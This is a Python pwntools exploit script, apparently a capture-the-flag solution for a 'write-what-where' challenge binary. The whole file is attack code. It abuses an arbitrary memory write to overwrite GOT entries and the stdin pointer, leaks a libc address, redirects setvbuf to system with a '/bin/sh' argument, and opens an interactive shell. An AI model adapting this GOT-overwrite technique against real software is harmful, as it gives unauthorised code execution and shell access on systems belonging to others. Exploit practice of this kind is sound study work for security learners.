from pwn import *


io = process('./write-what-where')
elf = ELF('./write-what-where')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def write(pos, data):
    print(io.recvuntil('what?\n'))
    io.send(data)
    print(io.recvuntil('where?\n'))
    io.sendline(str(pos))

write(elf.got['exit'], p32(elf.sym['main']+33))
write(elf.sym['stdin'], p32(elf.got['puts']))
write(elf.sym['stdin']+4, p32(0))
write(elf.got['setvbuf'], p32(elf.sym['puts']))
write(elf.got['setvbuf']+4, p32(0))
write(elf.got['exit'], p32(elf.sym['main']))
libc.address = u64(io.recv(6).ljust(8, b'\0')) - libc.sym['puts']
payload1 = int(hex(libc.sym['system'])[6:], 16)
payload2 = int(hex(libc.sym['system'])[:6], 16)
write(elf.got['exit'], p32(elf.sym['main']+33))
write(elf.bss()+128, '/bin')
write(elf.bss()+132, '/sh\0')
print(hex(elf.bss()))
write(elf.got['setvbuf'], p32(payload1))
write(elf.got['setvbuf']+4, p32(payload2))
payload1 = int(hex(next(libc.search(b'/bin/sh')))[6:], 16)
payload2 = int(hex(next(libc.search(b'/bin/sh')))[:6], 16)
write(elf.sym['stdin'], p32(payload1))
write(elf.sym['stdin']+4, p32(payload2))
write(elf.got['exit'], p32(elf.sym['main']))
io.interactive()
